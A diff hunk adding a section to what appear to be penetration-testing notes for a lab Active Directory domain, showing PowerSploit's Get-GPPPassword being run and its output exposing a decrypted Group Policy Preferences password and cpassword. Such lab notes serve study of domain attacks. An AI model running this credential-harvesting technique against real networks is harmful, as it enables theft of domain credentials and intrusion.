@@ -253,6 +253,24 @@ Get GPO objects
 	Disable Windows Defender          \\valhalla.local\SysVol\valhalla.local\Policies\{AF7B0056-348A-45D1-A9D3-490C93DFD017}
 
 
+Get GPP password
+
+	PS C:\Users\mrblack\Desktop\PowerSploit\Exfiltration> . .\Get-GPPPassword.ps1
+	PS C:\Users\mrblack\Desktop\PowerSploit\Exfiltration> Get-GPPPassword
+
+
+	UserName  : gpomademe
+	NewName   : [BLANK]
+	Password  : Password123!
+	Changed   : 2021-08-20 13:44:44
+	File      : C:\ProgramData\Microsoft\Group
+				Policy\History\{D96909A1-1659-40E6-894A-50B01B469E19}\Machine\Preferences\Groups\Groups.xml
+	NodeName  : Groups
+	Cpassword : VPe/o9YRyz2cksnYRbNeQoC7S+/HhWsGEcuvup04p1E
+
+
+
+	PS C:\Users\mrblack\Desktop\PowerSploit\Exfiltration>
 
 ## Check smb version and server info
 
